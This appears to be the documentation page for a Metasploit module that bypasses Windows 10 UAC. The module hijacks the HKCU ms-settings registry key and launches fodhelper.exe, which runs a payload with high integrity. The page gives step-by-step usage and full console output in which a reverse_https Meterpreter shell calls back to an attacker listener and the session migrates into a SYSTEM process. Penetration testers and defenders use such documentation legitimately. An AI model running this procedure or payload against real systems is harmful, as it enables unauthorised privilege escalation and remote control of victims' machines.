## Overview
This module will bypass Windows UAC in Windows 10 by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows FodHelper is launched. It will spawn a second shell that has the UAC flag turned off. This module modifies a registry key, but cleans up the key once the payload has been invoked.

The module requires the architecture of the payload to match the OS.  An x64 OS will require and x64 payload.

This module requires that the user attached to the session is an administrator and that UAC is not set to 'Always Notify'.

If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

## Method
This method was discovered by Christian B. "winscripting" and uses the fodhelper.exe included with Windows 10 to manage region-specific keyboard settings.

fodhelper.exe looks for the registry keys in `HKCU:\Software\Classes\ms-settings\shell\open\command` which does not exist by default in Windows 10. By adding values to this registry location a payload can be executed with high integrity thus bypassing UAC.

For specifics see [winscripting's blog post](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)

## Vulnerable Application

* Windows 10

## Verification Steps

  1. Gain a shell on a Windows 10 machine where session's user is an Administrator
  2. `use exploit/windows/local/bypassuac_fodhelper`
  3. Set a payload matching the machine's architecture.
  4. Set LHOST and LPORT as appropriate.
  5. Set the module 'Session' option to the correct session.
  6. `run`
  7. Enjoy a shell without UAC
  8. (Optional) Run post/windows/manage/priv_migrate to automatically migrate into a System level process.


## Known Issues
The only known issue is that a blue screen may quickly flash on the target machine when fodhelper.exe is called.

## Example Output
Using autorun script with post/windows/manage/priv_migrate to illustrate UAC bypass.

```
[*] https://0.0.0.0:13008 handling request from 10.14.1.1; (UUID: l4hvbqwf) Staging x86 payload (958531 bytes) ...
[*] Meterpreter session 4 opened (10.14.1.15:13008 -> 10.14.1.1:57259) at 2017-05-24 23:56:20 -0500
[*] Session ID 4 (10.14.1.15:13008 -> 10.14.1.1:57259) processing AutoRunScript 'multi_console_command -rc /home/jhale/git/ptwk/hacking/autoruns/migrate.rc'
[*] Running Command List ...
[*] 	Running command run post/windows/manage/priv_migrate
[*] Current session process is powershell.exe (6528) as: WIN10\Josh
[*] Session has User level rights.
[*] Will attempt to migrate to a User level process.
[*] Trying explorer.exe (6092)
[+] Successfully migrated to Explorer.EXE (6092) as: WIN10\Josh

msf exploit(bypassuac_fodhelper) > options

Module options (exploit/windows/local/bypassuac_fodhelper):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  4                yes       The session to run this module on.


Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.14.1.15       yes       The local listener hostname
   LPORT     13006            yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf exploit(bypassuac_fodhelper) > run

[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\WINDOWS\system32\cmd.exe /c C:\WINDOWS\System32\fodhelper.exe
[*] https://0.0.0.0:13006 handling request from 10.14.1.14; (UUID: r5nusjpp) Staging x64 payload (1190467 bytes) ...
[*] Meterpreter session 5 opened (10.14.1.15:13006 -> 10.14.1.14:57276) at 2017-05-24 23:56:50 -0500
[*] Session ID 5 (10.14.1.15:13006 -> 10.14.1.14:57276) processing AutoRunScript 'multi_console_command -rc /home/jhale/git/ptwk/hacking/autoruns/migrate.rc'
[*] Running Command List ...
[*] 	Running command run post/windows/manage/priv_migrate
[*] Cleaining up registry keys ...
[*] Current session process is powershell.exe (1076) as: WIN10\Josh
[*] Session is Admin but not System.
[*] Will attempt to migrate to specified System level process.
[-] Could not migrate to services.exe.
[-] Could not migrate to wininit.exe.
[*] Trying svchost.exe (744)
[+] Successfully migrated to svchost.exe (744) as: NT AUTHORITY\SYSTEM

```
